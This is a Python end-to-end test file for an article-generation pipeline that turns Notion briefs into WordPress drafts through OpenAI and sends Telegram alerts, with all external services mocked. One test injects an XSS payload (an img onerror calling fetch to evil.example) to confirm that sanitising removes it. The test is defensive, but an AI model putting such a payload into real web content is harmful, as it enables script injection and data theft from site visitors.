"""main() end to end with only HTTP, DNS and OpenAI mocked (everything else is the real code)."""

import json
import os
import socket
import tempfile
import unittest
from unittest import mock

import requests

from _env import TELEGRAM_TOKEN, ba

WP_URL = "https://client.example"
MODEL_HTML = (
    "<h1>Repeated title</h1><p>" + "palabra " * 1100 + "</p>"
    '<p>Más en <a href="https://client.example/">nuestro centro</a>.</p>'
)


class Response:
    def __init__(self, status=200, data=None, headers=None, body=b""):
        self.status_code = status
        self._data = data
        self.text = json.dumps(data) if data is not None else ""
        self.headers = requests.structures.CaseInsensitiveDict(headers or {})
        self._body = body

    def json(self):
        return self._data

    def raise_for_status(self):
        if self.status_code >= 400:
            raise requests.HTTPError(f"{self.status_code}")

    def iter_content(self, chunk_size=1):
        yield self._body

    def close(self):
        pass


class Services:
    """Plays Notion, WordPress, Serper, Telegram and the SERP page."""

    def __init__(self, model_html):
        self.model_html = model_html
        self.notion_states = []
        self.notes = []
        self.wp_posts = []
        self.telegram = []
        self.created_tags = []

    def post(self, url, json=None, **kwargs):
        if url.endswith("/databases/db-test/query"):
            if "and" in json["filter"]:  # quota count
                return Response(data={"results": [], "has_more": False})
            return Response(data={"results": [{"id": "page-1", "properties": {
                "Artículo": {"title": [{"plain_text": "Dormir"}]},
                "Keyword": {"rich_text": [{"plain_text": "dormir mejor"}]},
                "Enfoque": {"rich_text": [{"plain_text": "práctico"}]},
                "Cliente": {"relation": [{"id": "client-1"}]},
            }}]})
        if url == "https://google.serper.dev/search":
            return Response(data={"organic": [{"title": "Source", "link": "https://news.example/a", "snippet": "s"}]})
        if url == f"{WP_URL}/wp-json/wp/v2/posts":
            self.wp_posts.append(json)
            return Response(201, {"id": 77})
        if url.endswith("/wp-json/wp/v2/tags"):
            self.created_tags.append(json)
            return Response(201, {"id": 1})
        if url.startswith("https://api.telegram.org/"):
            self.telegram.append(json["text"])
            return Response(200, {"ok": True})
        raise AssertionError(f"unexpected POST {url}")

    def get(self, url, params=None, **kwargs):
        if url == "https://api.notion.com/v1/pages/client-1":
            return Response(data={"properties": {
                "Cliente": {"title": [{"plain_text": WP_URL + "/"}]},
                "Cupo/mes": {"number": 10},
            }})
        if url == "https://api.notion.com/v1/blocks/client-1/children":
            return Response(data={"results": [{"type": "paragraph", "paragraph": {"rich_text": [{"plain_text": "Guide"}]}}], "has_more": False})
        if url == f"{WP_URL}/wp-json/wp/v2/posts":
            return Response(data=[])
        if url == f"{WP_URL}/wp-json/wp/v2/categories":
            return Response(data=[{"name": "Salud", "id": 3}])
        if url == f"{WP_URL}/wp-json/wp/v2/tags":
            return Response(data=[{"id": 9, "name": "Sueño"}] if params["search"] == "sueño" else [])
        if url == f"{WP_URL}/wp-json/wp/v2/users":
            return Response(data=[{"id": 5, "name": "Client Author"}, {"id": 6, "name": "Client Author Jr"}])
        raise AssertionError(f"unexpected GET {url}")

    def patch(self, url, json=None, **kwargs):
        props = json["properties"]
        self.notion_states.append(props["Estado"]["select"]["name"])
        if "Nota" in props:
            self.notes.append(props["Nota"]["rich_text"][0]["text"]["content"])
        return Response(200, {})

    def session(self):
        class _Session:
            trust_env = True

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

            def get(self, url, **kwargs):
                assert url == "https://news.example/a", url
                return Response(headers={"Content-Type": "text/html"}, body=b"<p>Source data</p><script>x</script>")

        return _Session()

    def openai(self):
        client = mock.MagicMock()
        draft = {
            "titulo": "Cómo dormir mejor",
            "meta_titulo": "Cómo dormir mejor",
            "meta_descripcion": "Consejos para dormir mejor.",
            "slug": "dormir-mejor",
            "categoria_sugerida": "Salud",
            "excerpt": "Consejos.",
            "tags": ["sueño", "insomnio"],
            "html": self.model_html,
        }
        review = {"ok": True, "html_corregido": self.model_html, "nota": "ok"}
        client.chat.completions.create.side_effect = [
            mock.Mock(choices=[mock.Mock(message=mock.Mock(content=json.dumps(draft)))]),
            mock.Mock(choices=[mock.Mock(message=mock.Mock(content=json.dumps(review)))]),
        ]
        return client


def dns(host, port, *args, **kwargs):
    assert host == "news.example", host
    return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", port))]


class EndToEndTests(unittest.TestCase):
    def run_main(self, model_html):
        services = Services(model_html)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        creds = os.path.join(tmp.name, "wp_credentials.json")
        with open(creds, "w") as f:
            json.dump({WP_URL: {"wp_user": "bot", "wp_app_password": "abcd efgh ijkl mnop qrst uvwx"}}, f)
        with mock.patch.multiple(
            ba.requests, post=services.post, get=services.get, patch=services.patch, Session=services.session
        ), mock.patch.object(ba.socket, "getaddrinfo", dns), mock.patch.object(
            ba, "openai_client", services.openai()
        ), mock.patch.object(ba, "acquire_lock", return_value=True), mock.patch.object(
            ba, "WP_CREDENTIALS_FILE", creds
        ), mock.patch.object(ba, "DRY_RUN", False):
            ba.main()
        return services

    def test_clean_article(self):
        s = self.run_main(MODEL_HTML)
        self.assertEqual(s.notion_states, ["En curso", "Generado"])
        self.assertEqual(len(s.wp_posts), 1)
        post = s.wp_posts[0]
        self.assertEqual(post["status"], "draft")
        self.assertNotIn("<h1", post["content"])
        self.assertEqual(post["tags"], [9])
        self.assertEqual(post["categories"], [3])
        self.assertEqual(post["author"], 5)  # exact match only, "Client Author Jr" ignored
        self.assertEqual(s.created_tags, [])  # never creates tags
        self.assertIn("insomnio", s.notes[-1])
        self.assertEqual(len(s.telegram), 1)

    def test_injected_article(self):
        s = self.run_main(MODEL_HTML + '<img src=x onerror="fetch(`//evil.example`)"><a href="https://evil.example">x</a>')
        self.assertEqual(s.notion_states, ["En curso", "Revisar"])
        content = s.wp_posts[0]["content"]
        self.assertNotIn("<img", content)
        self.assertNotIn("evil.example", content)
        self.assertIn("Saneado", s.notes[-1])
        for text in s.telegram + s.notes:
            self.assertNotIn(TELEGRAM_TOKEN, text)


if __name__ == "__main__":
    unittest.main()
